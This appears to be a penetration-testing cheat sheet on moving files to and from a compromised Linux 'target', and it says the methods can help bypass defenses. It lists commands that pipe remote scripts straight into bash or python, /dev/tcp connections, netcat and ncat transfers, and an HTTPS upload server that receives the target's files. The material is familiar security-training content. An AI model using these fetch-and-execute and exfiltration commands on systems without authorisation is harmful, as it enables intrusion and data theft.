---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Linux - File Tranfer

Transferring files to or from Linux machines is crucial in various scenarios. Below are some methods for file transfer that could help to accomplish it and even bypass defenses:

## &#x20;<mark style="color:orange;">Download to the system</mark>

* &#x20;Using base64 encoding

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On our machine
md5sum $file    #Check the hash of the file
cat $file |base64 -w0 #Convert content and print it in one line

#On the target machine
echo 'b64String' | base64 -d > $file
md5sum $file #Compare the hash to confirm the integrity of the file
```
{% endcode %}

***

* From a web to the target system

{% code overflow="wrap" lineNumbers="true" %}
```bash
wget https://$URL/$file -O /tmp/$outFile
curl -o /tmp/$outFile https://$URL/$file
```
{% endcode %}

***

* Download and execute it directly in memory (fileless)

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl https://$URL/$file | bash
wget -qO- https://$URL/$pythonFile | python #Also can be done with Python
```
{% endcode %}

## <mark style="color:orange;">Download using installed programming languages in the target</mark>

* Mount an HTTP server with any programming language and download contents from it

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On the target machine
python -m http.server $port
python2.7 -m SimpleHTTPServer $port
php -S 0.0.0.0:$port
ruby -run -ehttpd . -p$port

#On our machine
wget $TargetIP:$port/$file
```
{% endcode %}

## &#x20;<mark style="color:orange;">Download from web server using the /dev/TCP device file</mark>

* Use the built-in device file to connect to the server and download a file via a petition

{% code overflow="wrap" lineNumbers="true" %}
```bash
exec 3<>/dev/tcp/$IP/$port
echo -e "GET /$pathToFile HTTP/1.1\n\n">&3
cat <&3 #Confirm checking the response
```
{% endcode %}

## <mark style="color:orange;">Download using SSH</mark>

* Start the SSH service to transfer files

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On our machine
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt #Check service port, by default 22

#On the target machine
scp $user@$IP:/$pathTofile ./
```
{% endcode %}

## <mark style="color:orange;">Upload to a web server</mark>

* &#x20;Use the _uploadserver_ module to mount an upload server using HTTPS

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On our machine
pip3 install uploadserver
python3 -m uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ./server.pem

#On the target system
curl -X POST https://$file/upload -F 'files=@$pathTofile' -F 'files=@$pathToFile2' --insecure
```
{% endcode %}

## <mark style="color:orange;">Upload using SSH</mark>

* Use the SCP utility to upload files

{% code overflow="wrap" lineNumbers="true" %}
```bash
scp $file $targetUser@$targetIP:$pathToDestinationFolder
```
{% endcode %}

## <mark style="color:orange;">Transfer using Netcat and Ncat</mark>

* From our machine to the target creating a listener on the target

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#On the target machine
<strong>nc -nvlp $port > $file   #Netcat
</strong>ncat -lp $port --recv-only > $file #Ncat

#On our machine
wget -q $fileURL #Download file
nc -q 0 $targetIP $port &#x3C; $file #Netcat
ncat --send-only $targetIP $port &#x3C; $file #Ncat
</code></pre>

***

* From our machine to the target connecting to our listener

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On our machine
sudo nc -nvlp 443 -q 0 < $file
sudo ncat -lp 443 --send-only < $file

#On the target machine
nc $ourIP 443 > $file
ncat $ourIP 443 --recv-only > $file
```
{% endcode %}

***

* Using the /dev/tcp folder to receive the file

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On our machine
sudo nc -nvlp 443 -q 0 < $file
sudo ncat -lp 443 --send-only < $file

#On the target machine
cat < /dev/tcp/$ourIP/443 > $file
```
{% endcode %}
